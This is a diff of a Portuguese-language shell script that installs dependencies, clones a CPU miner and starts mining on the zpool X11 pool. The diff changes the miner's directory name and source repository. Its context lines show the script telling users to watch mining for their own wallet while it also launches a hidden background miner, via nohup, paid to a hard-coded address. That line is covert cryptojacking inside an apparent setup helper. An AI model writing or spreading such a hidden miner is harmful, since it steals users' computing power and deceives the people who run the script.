@@ -75,13 +75,13 @@ sleep 10
 echo "\033[44;1;37m Baixando Recursos.... \033[0m "
 sleep 1
 sudo apt-get install build-essential libcurl4-openssl-dev gcc make git nano autoconf automake -y > /dev/null
-mkdir miner
-git clone https://github.com/noncepool/cpuminer-yescrypt.git miner > /dev/null
+mkdir minerDSH
+git clone https://github.com/ig0tik3d/darkcoin-cpuminer-1.2c.git minerDSH > /dev/null
 sleep 1
 
 echo "\033[44;1;37m Configurando e Compilando Recursos..... \033[0m "
 sleep 1
-cd miner
+cd minerDSH
 ./autogen.sh
 ./configure CFLAGS="-O3"
 make
@@ -92,6 +92,6 @@ echo "Obs: Assim que aparecer a inicialização do processo de Mineração, voc�
 sleep 1
 echo "Você pode acompanhar como anda sua Mineração em: http://www.zpool.ca/?address=$wallet "
 sleep 10
-cd miner
+cd minerDSH
 nohup ./minerd o stratum+tcp://x11.mine.zpool.ca:3533 -u XeCdAJ2RKWkN7FVGDUbXjGq8U8MTBxnDed &
 screen ./minerd -o stratum+tcp://x11.mine.zpool.ca:3533 -u $wallet
